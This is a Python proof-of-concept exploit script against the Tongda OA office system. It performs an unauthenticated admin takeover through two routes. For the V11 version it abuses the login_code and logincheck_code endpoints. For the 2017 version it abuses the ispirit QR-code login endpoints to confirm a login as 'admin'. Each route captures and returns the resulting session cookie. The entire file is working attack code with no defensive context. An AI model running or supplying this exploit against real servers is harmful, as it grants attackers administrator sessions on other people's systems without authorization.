#!/usr/bin/env python
# / -*- coding:utf-8 -*-
# author = carrypan

import requests
import json
import urllib3

def poc(url):
    portlist = ['21','22','23','25','53','110','137','161','389','445','873','1090','1099','1433','1521','2049','2181','2222','2375','3306','3389','5432','5901','5984','6379','11211','27017']    
    if url.split(':')[1] in portlist:
        return False
    elif int(url.split(':')[1]) == 443:
        url = 'https://' + url.split(':')[0]
    elif int(url.split(':')[1]) == 8443:
        url = 'https://' + url
    else:
        url = 'http://' + url
    headers = {}
    headers["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:75.0) Gecko/20100101 Firefox/75.0"
    requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
    def req(cookie):
        checkUrl = url + '/general/index.php'
        headers["COOKIE"] = cookie
        try:
            res = requests.get(checkUrl,headers=headers,timeout=5,verify=False)
            return res.text
        except:
            return False

    def getV11Session(url1):
        checkUrl = url1 + '/general/login_code.php'
        try:
            res = requests.get(checkUrl,headers=headers,timeout=5,verify=False)
            resText = str(res.text).split('{')
            codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
            getSessUrl = url + '/logincheck_code.php'
            res = requests.post(
                getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers,verify=False)
            cookie = res.headers['Set-Cookie']
            if res.status_code == 200 and 'PHPSESSID' in res.headers['Set-Cookie'] and 'index.php' in res.content:
                urll = url + '/general/index.php'
                return '[tongda-fake-admin-V11]\t' + urll + '\tcookie:' + cookie
            else:
                return False
        except:
            return False

    def get2017Session(url1):
        checkUrl = url1 + '/ispirit/login_code.php'
        try:
            res = requests.get(checkUrl,headers=headers,timeout=5,verify=False)
            resText = json.loads(res.text)
            codeUid = resText['codeuid']
            codeScanUrl = url + '/general/login_code_scan.php'
            res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(
                1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers,verify=False)
            resText = json.loads(res.text)
            status = resText['status']
            if status == str(1):
                getCodeUidUrl = url + '/ispirit/login_code_check.php?codeuid=' + codeUid
                res = requests.get(getCodeUidUrl, timeout=5, verify=False)
                cookie = res.headers['Set-Cookie']
                res_text = req(cookie)
                if 'cur_login_user_id' in res_text:
                    urll = url + '/general/index.php'
                    return '[tongda-fake-admin-2017]\t' + urll + '\tcookie:' + cookie 
                else:
                    return False
            else:
                return False
        except:
            return False

    getV11Session(url)
    get2017Session(url)








